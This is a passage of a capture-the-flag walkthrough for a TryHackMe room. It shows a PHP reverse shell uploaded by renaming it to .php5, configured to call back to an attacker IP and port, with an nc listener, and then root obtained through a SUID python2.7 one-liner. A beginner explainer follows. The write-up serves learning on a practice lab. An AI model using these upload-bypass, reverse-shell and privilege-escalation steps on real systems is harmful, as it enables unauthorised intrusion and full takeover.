### Directory Analysis

- **`/css`** — Just CSS files, nothing of value.
- **`/uploads`** — An empty directory that stores uploaded files.
- **`/panel`** — An exposed page that allows direct uploads. This is where we can upload our reverse shell.
- **`/js`** — An open directory hosting `maquina_de_escrever.js` (translates to `typewriter.js`).

`maquina_de_escrever.js`:

```javascript
function typeWrite(element) {
  const textArray = element.innerHTML.split("");
  element.innerHTML = " ";
  textArray.forEach(function (letter, i) {
    setTimeout(function () {
      element.innerHTML += letter;
    }, 75 * i);
  });
}
```

`index.php`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/home.css" />
    <script src="js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
  </head>
  <body>
    <div class="main-div">
      <p class="title">root@rootme:~#</p>
      <p class="description">Can you root me?</p>
    </div>
    <script>
      const titulo = document.querySelector(".title");
      typeWrite(titulo);
    </script>
  </body>
</html>
```

Based on the above, `/panel/` is where the magic happens.

## 2. Achieving a Reverse Shell

The PHP reverse shell used: [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Attempting to upload the reverse shell via `/panel/` fails — `.php` files are blocked.

![fail](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/rootme2.png)

After some research, PHP supports alternative extensions: `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`. Renaming the file to `.php5` bypasses the filter.

Before uploading, update the shell config:

```php
$ip = '192.168.133.88';  // Your attacker IP
$port = 4242;            // Your listener port
```

> **Note:** Check your UFW rules if running your own attackbox.

The upload succeeds, and the file appears in `/uploads/`. Start a listener and trigger the shell by visiting the uploaded file:

![upload](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/rootme3.png)

```bash
sudo nc -lvnp 4242
```

### Shell Obtained

```bash
connect to [192.168.133.88] from (UNKNOWN) [10.65.135.174] 54714
Linux ip-10-65-135-174 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### Finding `user.txt`

```bash
find / -type f -name "user.txt" 2>/dev/null
```

```bash
/var/www/user.txt
```

```bash
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## 3. Privilege Escalation

Find files with the SUID bit set:

```bash
find / -type f -perm -4000 2>/dev/null
```

```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7        <-- unusual!
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
```

`/usr/bin/python2.7` stands out — a Python binary with SUID set as root is not normal. Confirm:

```bash
$ ls -l /usr/bin/python2.7
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
```

Exploit it to spawn a root shell:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
whoami
root
```

### Finding `root.txt`

```bash
find / -type f -name "root.txt" 2>/dev/null
```

```bash
/root/root.txt
```

```bash
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.

---

## Key Takeaways for Beginners

### 1. Always Start with a Port Scan

The first thing you do when attacking a machine is find out what's running on it. **Nmap** is the standard tool for this. It tells you which ports are open and what services are listening on them. In this room, we found two: SSH on port 22 and a web server on port 80. The web server became our way in.

> Think of ports like doors on a building — Nmap tells you which ones are open and what's behind them.

---

### 2. Directory Busting Finds Hidden Pages

Websites often have pages that aren't linked anywhere publicly. Tools like **Gobuster** brute-force common directory and file names to discover them. Here, we found `/panel/` — an upload page that the site owner probably didn't intend to be exposed. Without this step, we'd have had no way in.

> If a door isn't listed, it doesn't mean it doesn't exist. Gobuster checks them all.

---

### 3. File Upload Filters Can Often Be Bypassed

The site blocked `.php` file uploads, but PHP actually runs under several other extensions like `.php5`. This is a classic **file upload bypass** — the filter was checking the extension but not the actual file content. Always try alternate extensions when a file type is blocked.

> Security filters that only check the filename are easy to trick. Good filters check the actual file contents too.

---

### 4. A Reverse Shell Gives You Remote Code Execution

A **reverse shell** is a script that, when executed on a target machine, connects _back_ to your machine and gives you a command prompt. We uploaded one disguised as a `.php5` file, then used `netcat` (`nc`) to listen for the incoming connection. Once the server ran our file, we had a live shell on the machine.

> Instead of knocking on the target's door, you make the target call _you_.

---

### 5. SUID Binaries Are a Common Priv Esc Vector

**SUID** (Set User ID) is a Linux permission that allows a program to run as its owner — often root — regardless of who executes it. When a program like Python has SUID set as root, you can use it to run commands _as root_. This is a well-known privilege escalation technique and is frequently misconfigured on CTF machines (and sometimes real ones).

> Finding an SUID binary you can abuse is like finding a master key left in the wrong hands.

---

### 6. `find` Is Your Best Friend

The `find` command was used twice in this room — once to locate `user.txt` and again to find SUID binaries. Learning to use `find` effectively is a core skill in CTFs and real-world pentesting.

```bash
# Find a specific file anywhere on the system
find / -type f -name "filename.txt" 2>/dev/null

# Find all SUID binaries
find / -type f -perm -4000 2>/dev/null
```

The `2>/dev/null` part just hides error messages so your output stays clean.

---

### 7. GTFOBins Is Your Go-To Reference

When you find a SUID binary, check **[GTFOBins](https://gtfobins.github.io/)** — a curated list of Unix binaries that can be abused for privilege escalation, shell escapes, and more. If a binary is on that list and has SUID set, there's likely a one-liner to get a root shell.
